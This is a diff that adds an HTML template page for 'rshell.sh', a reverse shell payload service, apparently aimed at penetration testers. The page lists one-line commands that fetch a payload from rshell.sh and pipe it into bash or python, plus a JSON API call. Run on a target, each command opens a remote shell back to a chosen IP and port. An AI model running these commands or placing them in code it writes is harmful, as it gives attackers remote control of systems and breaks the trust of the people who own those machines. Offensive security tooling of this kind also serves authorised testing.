@@ -1,0 +1,40 @@
+{% extends 'base.html' %}
+
+{% block body %}
+
+<h1>rshell.sh</h1>
+<h2>Reverse Shell Payload Microservice</h2>
+<hr>
+<h3><u>Examples</u></h3>
+* Basic Usage: 
+<pre>
+curl rshell.sh/10.0.0.1/1234 | bash
+</pre>
+
+* Different Languages:
+<pre>
+curl rshell.sh/python/10.0.0.1/1234 | python 
+</pre>
+
+* Quote Wrapped:
+<pre>
+curl rshell.sh/10.0.0.1/1234?q=y | xargs bash -c
+</pre>
+
+* <a href="/help">Help Page</a>:
+<pre>
+curl rshell.sh/help
+</pre>
+
+* JSON API:
+<pre>
+curl -d '{"host":"10.0.0.1", "port":"1234"}' -H "Content-Type: application/json" -X POST  https://rshell.sh/api
+</pre>
+
+<br>
+<p style="color: red"><u><b>No Use 4 Bad Hax!!!</b></u></p>
+
+<br>
+<a href="https://github.com/BlueSquare23/Rshell.sh">Project's Github</a>
+
+{% endblock %}
